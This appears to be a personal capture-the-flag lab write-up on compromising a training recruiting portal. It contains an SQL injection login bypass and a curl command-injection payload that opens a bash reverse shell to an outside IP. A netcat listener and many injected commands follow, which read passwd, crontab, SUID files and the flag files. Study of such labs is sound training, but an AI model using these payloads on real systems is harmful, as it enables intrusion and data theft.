---
dg-publish: true
---
Room Description: You are up for promotion at **Hadron Security**. Your senior lead, Mara, has handed you a solo engagement against **RecruitCorp**, a small recruiting firm with a public-facing portal. Compromise the host, capture the flags, and demonstrate that you are ready for the Penetration Tester title.

System Info: Parrot OS 7.2 VMWare Workstation Player


1) NMAP Scan
		1) ![[Pasted image 20260629110439.png]]
2) GOBUSTER Scan 
		1) ![[Pasted image 20260629111725.png]]
3) Browse to admin portal found in GoBuster Scan
	1) ![[Pasted image 20260629113403.png]]
		1) I attempted to login using basic credentials with no luck
		2) I then attempted SQL Injection
			1) `admin' OR '1'='1' --`
				1) ![[Pasted image 20260629113641.png]]
4) Attempted user lookup and noticed potential PHP exploit for root access
	1) ![[Pasted image 20260629114427.png]]
	2) ![[Pasted image 20260629115055.png]]
5) root:x:0:0:root:/root:/bin/bash
6) jford:x:1001:1001::/home/jford:/bin/bash
7) Reverse Shell?

curl -b "PHPSESSID=your_actual_session_id" \
  "http://10.144.135.34/admin/sysmaint-checks/ping.php?host=;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.133.226/4444+0>%261'"
  
```


`nc -lvnp 4444`

`ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1`

python3 -c 'import pty;pty.spawn("/bin/bash")' 
Ctrl+Z 
stty raw -echo; fg export 
TERM=xterm


?host=;find+/+-name+"user.txt"+2>/dev/null 
?host=;find+/+-name+"root.txt"+2>/dev/null 
host=;find+/home+-type+f+2>/dev/null

?host=;cat+/etc/crontab
?host=;ls+-la+/etc/cron*
?host=;ps+aux
?host=;find+/+-perm+-4000+-type+f+2>/dev/null
?host=;sudo+-l
?host=;ls+-la+/home/
?host=;grep+-v+"nologin\|false"+/etc/passwd
?host=;find+/+-name+"flag.txt"+2>/dev/null 
?host=;find+/+-name+"*.txt"+/home+/root+2>/dev/null 
?host=;cat+/root/root.txt 
?host=;cat+/home/*/user.txt 
?host=;ls+-la+/root/